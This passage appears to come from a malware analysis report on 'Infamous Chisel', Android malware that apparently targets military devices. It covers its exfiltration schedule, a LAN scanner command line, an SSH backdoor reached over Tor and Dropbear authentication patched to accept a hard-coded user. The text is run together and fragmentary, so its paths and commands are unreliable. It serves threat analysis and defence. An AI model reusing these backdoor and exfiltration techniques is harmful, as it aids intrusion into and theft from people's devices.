hashes This means if the number of files to exfiltrate from the device exceeds 16384 files will be sent multiple timesOn execution the Infamous Chisel netd component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks All timer actions are executed immediately on first execution and then at the specific intervalsEvery 86000 seconds 23 hours 53 minutes and 20 seconds the following actions are performed1 File exfiltration from data directoriesThe following directories are recursively searched for files matching the extensions listed When a file is found by this search it is exfiltrated as detailed in the Communications File exfiltration Section of this reportFile extension listDirectory listAlong with other military specific application

following directories are searched for files of type json or jsonbak which are then immediately exfiltratedAlong with some military application specific directoriesEvery 172000 seconds 1 day 23 hours 46 minutes and 20 seconds the local area network is scannednetd has a built-in network scanner that is executed by the command linenetd minmap -i any -noping -o datalocaltmpndatatmpThe ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol TCP ports Internet Control Message Protocol ICMP scanning is disabled due to the noping command line parameter specifiedThe scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server The responses from other ports are also loggedNote This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hostsOn completion of this scan the ndatatmp file is moved to the filename ndatacsv in the same directory This file is exfiltrated immediately and both files removed from the tmp directoryThe contents of this file will appear

datalocalprxhsDuring the execution of td an onion domain for a hidden service is randomly generated at the path datalocalprxhshostname which is then exfiltrated by netd The db component performs further configuration detailed in the Multi-call binaries Watchdogsection of this report to enable a SSH connection via this onion domain This gives the actor the ability to create an SSH session by connecting to the hidden service across TorThe blob component is responsible for configuring Tor services and checking network connectivity Every 15 seconds the tmp directory is checked for the blob

utility deletes datalocaltmpsessionslogdsshremovefileflagThe actor has modified authentication mechanisms in DropbearThe Dropbear function fillpasswd is used to verify that a supplied username is a valid account and return information required to process authenticationThe unmodified source code for this can be found in the Appendix Dropbear fillpasswd functionSection of this reportThis function calls multiple Linux library functions getpwnam getspnam getpwuid but in the modified version actor replacement functions are called instead each of these are discussed belowgetpwnam Linux library function accepts a username and cross-references it with the passwd file usually stored at etcpasswd for the corresponding entry containing the colon concatenated fieldsOn most modern systems an x in the user password field is used to denote that the password hash is stored in the etcshadow file that requires root privileges to read On an Android device there are typically no such files so the structure that would usually be retrieved from the passwd file is generated insteadThe actor has replaced this function with their own where if a particular username is seen it returns a hard-coded response If the expected username is not seen the etcpasswd file is checked for the corresponding username as normalgetpwuid Linux library accepts a uid and returns the corresponding structure above typically from the etcpasswd file The actor has replaced this function to check for the uid of 0xbeef and return the hard-coded structure detailed above if found If 0xbeef is not seen it will revert to checking etcpasswdgetspnam Linux library function accepts a username and cross-references it with the shadow file usually stored at etcshadow for the corresponding entry that contains the dollar concatenated fieldsTypically on an Android device this function would return NULL but the actor replacement function uses the Linux versionThere does not appear to be any modifications other than those detailed above but there may be other patches implementedThe NDBRarmv7l and NDBRi686 utilities contain multiple individual utilities compiled for ARM and x86 respectively They both include the above authentication mechanism modification although with different credentials and otherwise appear to be the samekiller is a simple program the main purpose of which is to terminate netdIt achieves this by performing the following stepsWhen a file is to be exfiltrated a Transport Layer Security TLS connection is initiated to a hard-coded local IP and portNote This local IP address is likely a local port forward to relay the network traffic over a secure channel such as a Virtual Private Network VPN configured on the device VPN services are often configured in this way giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network trafficIf a connection to the local IP and port fails a hard-coded domain is used as a fallback connection The IP address for this domain is resolved using a request to dnsgooglePOST dns-query HTTP11Host dnsgoogleUser-Agent Mozilla50 Windows NT 61 Win64 x64 rv470 Gecko20100101 Firefox470Accept applicationdns-messageContent-Type applicationdns-messageContent-LengthNote The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device But since all the communications are under TLS it would make inspecting the HTTP headers difficultThe following HTTP Post request is used to exfiltrate dataData structurePOST

activityThe searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks Although the components lack basic obfuscation or stealth techniques to disguise activity the actor may have deemed this not necessary since many Android devices do not have a host-based detection systemTwo interesting techniques are present in Infamous ChiselThese techniques require a good level of C knowledge to make the alterations and an awareness of Linux authentication and boot mechanismsEven with the lack of concealment functions these components present a serious threat because of the impact of the information they can collectTypeDescriptionValuesnetd POST RequestC2 communicationPOST
